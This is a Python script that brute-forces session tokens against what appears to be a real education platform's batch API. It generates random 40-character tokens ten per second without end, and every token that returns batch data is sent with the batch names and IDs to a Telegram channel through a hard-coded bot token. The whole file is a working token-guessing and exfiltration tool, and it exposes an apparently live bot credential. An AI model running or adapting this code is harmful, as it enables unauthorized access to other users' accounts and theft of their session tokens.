import random
import string
import asyncio
from telegram import Bot
import aiohttp

# Your Telegram bot token and target channel chat ID
TELEGRAM_BOT_TOKEN = '7853203368:AAE801naC4GMeyrkEfyflPItRwMvLmQddPY'
CHANNEL_CHAT_ID = '-1002478793346'  # Or chat ID like -1001234567890

# Function to generate a random 40-character token
def generate_random_token():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=40))

# Function to fetch and send the JSON response for a token if it has batch data
async def check_token(session, token):
    url = "https://spec.iitschool.com/api/v1/my-batch"
    
    headers = {
        'Accept': 'application/json',
        'origintype': 'web',
        'token': token,
        'usertype': '2',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    try:
        async with session.get(url, headers=headers, timeout=1) as response:
            if response.status == 200:
                data = await response.json()
                
                # Check if batchData exists and is not empty
                if 'batchData' in data and data['batchData']:
                    for batch in data['batchData']:
                        batch_name = batch.get('batchName', 'N/A')
                        batch_id = batch.get('id', 'N/A')
                        await send_to_telegram(token, batch_name, batch_id)
                    return True
    except Exception as e:
        pass  # Ignore request exceptions to maintain speed
    return False

# Function to send a message to the target Telegram channel asynchronously
async def send_to_telegram(token, batch_name, batch_id):
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    message = f"Token: {token}\n{batch_name} - {batch_id}"
    await bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message)

# Function to send progress updates to the Telegram channel every second
async def send_progress_update(tokens_checked, found_tokens):
    progress_message = f"Checked {tokens_checked} tokens, found {found_tokens} with batches."
    await send_to_telegram('', progress_message, '')

# Function to check 10 random tokens per second, indefinitely
async def check_tokens_infinite():
    tokens_checked = 0
    found_tokens = 0
    
    async with aiohttp.ClientSession() as session:  # Create a session for aiohttp
        while True:
            # Generate 10 random tokens for each second
            tokens = [generate_random_token() for _ in range(10)]
            
            # Check tokens concurrently using asyncio
            tasks = [check_token(session, token) for token in tokens]
            results = await asyncio.gather(*tasks)
            
            for result in results:
                if result:
                    found_tokens += 1
                tokens_checked += 1
            
            # Send the progress update to the channel
            await send_progress_update(tokens_checked, found_tokens)
            
            await asyncio.sleep(1)  # Delay for 1 second to check 10 tokens per second

# Run the token check indefinitely using asyncio
async def main():
    await check_tokens_infinite()

if __name__ == '__main__':
    asyncio.run(main())
